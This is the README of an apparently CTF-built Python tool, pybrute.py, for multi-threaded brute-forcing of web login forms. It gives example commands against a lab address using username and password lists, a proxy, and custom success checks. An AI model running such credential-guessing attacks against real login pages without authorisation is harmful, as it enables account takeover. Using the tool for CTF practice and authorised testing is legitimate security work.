## A multi threaded brute force script I wrote in python while working on a ctf


### Examples

Manually pass in usernames and passwords:
```
./pybrute.py --url "http://10.10.10.73/login.php" -u admin -u Admin -u Administrator -p admin -p password
```


Use a password lists:
```
./pybrute.py --url "http://10.10.10.73/login.php" -u chris -u admin -l password-list.txt
```

Send through a proxy (useful for debugging):
```
./pybrute.py --url "http://10.10.10.73/login.php" -L usernames-list.txt -l password-list.txt --proxy localhost:8080
```

Turn off multi-threading:
```
./pybrute.py --url "http://10.10.10.73/login.php" -L usernames-list.txt -l password-list.txt -t 1
```

Customize post params:
```
./pybrute.py --url "http://10.10.10.73/login.php" -L usernames-list.txt -l password-list.txt -t 1
```

Customize success check:
```
# if failures return a 200 but a success returns anything but a 200
./pybrute.py --url "http://10.10.10.73/login.php" -L usernames-list.txt -l password-list.txt -b 200

# only check for specific codes
./pybrute.py --url "http://10.10.10.73/login.php" -L usernames-list.txt -l password-list.txt -g 200 -b 301

# match regex
./pybrute.py --url "http://10.10.10.73/login.php" -L usernames-list.txt -l password-list.txt --needle "success"

```

Other things you can customize:
- headers (using the -h option)
- the successful check (using http codes with -g or -b for the inverse, --needle for a regular expression)
- log the responses of each attempt (the --log-responses option)

Todo:
- more testing
- handle json
- handle different http methods
- handle 500s
